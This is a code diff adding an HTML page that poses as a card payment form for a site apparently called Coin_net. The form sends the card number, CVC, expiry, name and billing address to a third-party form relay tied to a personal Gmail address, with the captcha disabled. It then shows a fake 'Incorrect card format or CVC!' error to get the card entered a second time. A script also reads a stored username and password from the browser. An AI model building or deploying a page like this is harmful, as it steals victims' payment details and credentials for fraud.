@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+  <title>payment page</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background-color: #000;
+      font-family: Arial, sans-serif;
+      color: #fff;
+    }
+
+    *, *::before, *::after {
+      box-sizing: border-box;
+    }
+
+    #loader {
+      position: fixed;
+      inset: 0;
+      background-color: #000000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #444;
+      border-top: 5px solid #fff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    #page-content {
+      display: none;
+      padding: 20px;
+      max-width: 400px;
+      margin: 0 auto;
+    }
+
+    .gpay-btn {
+      background-color: #000;
+      color: white;
+      border: 1px solid #555;
+      padding: 12px;
+      font-size: 16px;
+      width: 100%;
+      border-radius: 5px;
+      cursor: none;
+      margin-bottom: 20px;
+    }
+
+    .gpay-btn span {
+      font-weight: bold;
+      margin-right: 5px;
+    }
+
+    .separator {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 20px 0;
+      color: #aaa;
+    }
+
+    .separator::before,
+    .separator::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background-color: #444;
+    }
+
+    .separator span {
+      padding: 0 10px;
+      background-color: #000;
+      font-size: 14px;
+      border-radius: 5px;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      margin-bottom: 5px;
+      font-size: 14px;
+      color: #ccc;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 5px;
+      border-radius: 4px;
+      border: 1px solid #666;
+      background-color: #111;
+      color: #fff;
+      font-size: 14px;
+    }
+
+    .card-info {
+      display: flex;
+      gap: 10px;
+    }
+
+    .card-info input {
+      flex: 1;
+    }
+
+    .card-icons {
+      display: flex;
+      gap: 5px;
+      margin: 8px 0 15px;
+    }
+
+    .card-icons img {
+      height: 24px;
+    }
+
+    .pay-btns {
+      background-color: #ffffff;
+      color: 000000;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      width: 100%;
+      height: 60px;
+      border-radius: 10px;
+      cursor: none;
+      margin-top: 25px;
+    }
+ 
+   .error {
+      color: #ff4d4d;
+      font-size: 13px;
+      margin-bottom: 8px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Spinner -->
+  <div id="loader"><div class="spinner"></div></div>
+
+  <!-- Payment Form -->
+  <div id="page-content">
+    <button class="gpay-btn">User:<span style="margin-left: 2%;"id="usernameDisplay"></span></button>
+
+    <div class="separator"><span>Pay with card</span></div>
+
+    <form id="paymentForm" action="https://formsubmit.co/coinnet50@gmail.com" method="POST">
+      <!-- REQUIRED for formsubmit to work without captcha -->
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+
+      <label for="email">Email</label>
+      <input type="email" id="email" name="Email" placeholder="Email" />
+      <div id="emailError" class="error"></div>
+
+      <label>Card information</label>
+      <input type="text" id="cardNumber" name="Card Number" placeholder="1234 1234 1234 1234" maxlength="19" />
+     <div id="cardLogo" style="display:inline-block; vertical-align:middle; margin-left:10px;"></div>
+      <div id="cardError" class="error"></div>
+
+      <div class="card-info">
+        <input type="text" id="expiry" name="Expiry Date" placeholder="MM/YY" maxlength="5" />
+        <input type="text" id="cvc" name="CVC" placeholder="CVC" maxlength="3" />
+      </div>
+      <div id="dateError" class="error"></div>
+
+      <div class="card-icons">
+   <svg width="40" height="24" viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg">
+    <rect width="48" height="32" rx="4" fill="#1A1F71"/>
+    <text x="24" y="20" text-anchor="middle" fill="white" font-family="Arial, sans-serif" font-size="12" font-weight="bold">VISA</text>
+  </svg>
+
+  <!-- Mastercard Logo -->
+  <svg width="40" height="24" viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg">
+    <rect width="48" height="32" rx="4" fill="#ffffff"/>
+    <circle cx="20" cy="16" r="10" fill="#EB001B"/>
+    <circle cx="28" cy="16" r="10" fill="#F79E1B"/>
+    <text x="24" y="30" text-anchor="middle" fill="#000" font-family="Arial, sans-serif" font-size="7">Mastercard</text>
+  </svg>
+  
+  <!-- American Express Logo -->
+<svg width="40" height="24" viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg">
+  <rect width="48" height="32" rx="4" fill="#ffffff"/>
+  <rect x="10" y="8" width="28" height="16" rx="2" fill="#2E77BC"/>
+  <text x="24" y="20" text-anchor="middle" fill="#fff" font-family="Arial, sans-serif" font-size="6.5" font-weight="bold">AMEX</text>
+</svg>
+      </div>
+
+      <label for="name">Name on card</label>
+      <input type="text" id="name" name="Name" placeholder="Name on card" />
+      <div id="nameError" class="error"></div>
+
+     <label>Country & States</label>
+      <input type="text" id="State" name="state and country" placeholder="California, United States" />
+      
+      
+ <label>Billing address</label>
+      <input type="text" id="State" name="billing address" placeholder="1234 Sunset Boulevard, Los Angeles, CA 90026, United States"/>
+      
+       <input type="hidden" name="_next" value="http://localhost:8080/Coin_net.com/payment.html?success=true">
+            
+<div id="successNotice" class="success-message" style="color: #bd0008; font-size: 15px; margin-top: 5px;"></div>
+
+<div id="spinner" style="display: none; margin-top: 10px;">
+  <p>Processing...</p>
+</div>
+
+      <button type="submit" class="pay-btns">Add Card</button>
+    </form>
+  </div>
+
+ <style>
+    #message-box {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #444;
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-size: 16px;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+      z-index: 1000;
+    }
+
+    #message-box.show {
+      opacity: 1;
+    }
+  </style>
+  <div id="message-box"></div>
+  <script>
+    const messageBox = document.getElementById('message-box');
+
+    function showMessage(text, duration = 3000) {
+      messageBox.textContent = text;
+      messageBox.classList.add('show');
+
+      setTimeout(() => {
+        messageBox.classList.remove('show');
+      }, duration);
+    }
+
+    window.addEventListener('online', () => {
+      showMessage('You are now online.');
+    });
+
+    window.addEventListener('offline', () => {
+      showMessage('Error: You are currently offline.');
+    });
+  </script>
+
+  <!-- Scripts -->
+<script>
+  window.addEventListener('load', () => {
+    setTimeout(() => {
+      document.getElementById('loader').style.display = 'none';
+      document.getElementById('page-content').style.display = 'block';
+    }, 1500);
+
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('success') === 'true') {
+      document.getElementById('successMessage').style.display = 'block';
+      document.getElementById('paymentForm').style.display = 'none';
+    }
+  });
+
+  const form = document.getElementById('paymentForm');
+
+  form.addEventListener('submit', function (e) {
+    const email = document.getElementById('email');
+    const card = document.getElementById('cardNumber');
+    const expiry = document.getElementById('expiry');
+    const cvc = document.getElementById('cvc');
+    const name = document.getElementById('name');
+
+    const emailVal = email.value.trim();
+    const cardVal = card.value.replace(/\s+/g, '');
+    const expiryVal = expiry.value.trim();
+    const cvcVal = cvc.value.trim();
+    const nameVal = name.value.trim();
+
+    let valid = true;
+
+    if (!/@(gmail\.com|email\.com)$/i.test(emailVal)) {
+      showError('email', 'invalued email address');
+      valid = false;
+    } else clearError('email');
+
+    if (!/^\d{16}$/.test(cardVal) || !luhnCheck(cardVal)) {
+      showError('card', 'Invalid card number');
+      valid = false;
+    } else clearError('card');
+
+    if (!/^\d{2}\/\d{2}$/.test(expiryVal) || !/^\d{3,4}$/.test(cvcVal)) {
+      showError('date', 'Invalid expiry');
+      valid = false;
+    } else clearError('date');
+
+    if (!/^[a-zA-Z\s]+$/.test(nameVal)) {
+      showError('name', 'invalued name on card');
+      valid = false;
+    } else clearError('name');
+
+    if (!valid) {
+      e.preventDefault();
+    }
+  });
+
+  document.getElementById('cardNumber').addEventListener('input', (e) => {
+    const val = e.target.value.replace(/\D/g, '').substring(0, 16);
+    e.target.value = val.replace(/(.{4})/g, '$1 ').trim();
+    clearError('card');
+
+    const cardType = detectCardType(val);
+    const logoContainer = document.getElementById('cardLogo');
+
+    if (cardType) {
+      logoContainer.innerHTML = getCardSVG(cardType);
+    } else {
+      logoContainer.innerHTML = '';
+    }
+  });
+
+  document.getElementById('expiry').addEventListener('input', (e) => {
+    let val = e.target.value.replace(/\D/g, '');
+    if (val.length > 4) val = val.slice(0, 4);
+    if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2);
+    e.target.value = val;
+    clearError('date');
+  });
+
+  document.getElementById('cvc').addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
+    clearError('date');
+  });
+
+  document.getElementById('email').addEventListener('input', () => clearError('email'));
+  document.getElementById('name').addEventListener('input', () => clearError('name'));
+
+  function showError(field, message) {
+    document.getElementById(field + 'Error').textContent = message;
+  }
+
+  function clearError(field) {
+    document.getElementById(field + 'Error').textContent = '';
+  }
+
+  function luhnCheck(number) {
+    let sum = 0;
+    let double = false;
+    for (let i = number.length - 1; i >= 0; i--) {
+      let digit = parseInt(number[i]);
+      if (double) {
+        digit *= 2;
+        if (digit > 9) digit -= 9;
+      }
+      sum += digit;
+      double = !double;
+    }
+    return sum % 10 === 0;
+  }
+
+  function detectCardType(number) {
+    if (/^4/.test(number)) return 'visa';
+    if (/^5[1-5]/.test(number) || /^2(2[2-9]|[3-6]|7[01])/.test(number)) return 'mastercard';
+    if (/^3[47]/.test(number)) return 'amex';
+    if (/^6(?:011|5)/.test(number)) return 'discover';
+    return null;
+  }
+
+  function getCardSVG(type) {
+    switch (type) {
+      case 'visa':
+        return `
+        <svg width="40" height="24" viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg">
+          <rect width="48" height="32" rx="4" fill="#ffffff" stroke="#ccc"/>
+          <text x="24" y="20" text-anchor="middle" fill="#1A1F71" font-family="Arial, sans-serif" font-size="12">VISA</text>
+        </svg>`;
+      case 'mastercard':
+        return `
+        <svg width="40" height="24" viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg">
+          <rect width="48" height="32" rx="4" fill="#ffffff" stroke="#ccc"/>
+          <circle cx="20" cy="16" r="10" fill="#EB001B"/>
+          <circle cx="28" cy="16" r="10" fill="#F79E1B"/>
+          <text x="24" y="30" text-anchor="middle" fill="#000" font-family="Arial, sans-serif" font-size="7">Mastercard</text>
+        </svg>`;
+      case 'amex':
+        return `
+        <svg width="40" height="24" viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg">
+          <rect width="48" height="32" rx="4" fill="#ffffff" stroke="#ccc"/>
+          <text x="24" y="20" text-anchor="middle" fill="#2E77BC" font-family="Arial, sans-serif" font-size="10">AMEX</text>
+        </svg>`;
+      case 'discover':
+        return `
+        <svg width="40" height="24" viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg">
+          <rect width="48" height="32" rx="4" fill="#ffffff" stroke="#ccc"/>
+          <text x="24" y="20" text-anchor="middle" fill="#F76C0E" font-family="Arial, sans-serif" font-size="10">Discover</text>
+        </svg>`;
+      default:
+        return '';
+    }
+  }
+</script>
+<script>
+  const urlParams = new URLSearchParams(window.location.search);
+  const successNotice = document.getElementById('successNotice');
+
+  if (urlParams.get('success') === 'true') {
+    successNotice.textContent = 'Incorrect card format or CVC!';
+
+    // Auto-hide after 4 seconds (8000 ms)
+    setTimeout(() => {
+      successNotice.textContent = '';
+    }, 8000);
+  }
+</script>
+   <script>
+    // Get data from localStorage
+    const storedUsername = localStorage.getItem('userUsername');
+    const storedPassword = localStorage.getItem('userPassword');
+
+    // Display in the page
+    document.getElementById('usernameDisplay').textContent = storedUsername || 'Not found';
+    document.getElementById('passwordDisplay').textContent = storedPassword || 'Not found';
+  </script>
+  <script src="disable-zoom.js"></script>
+</body>
+</html>
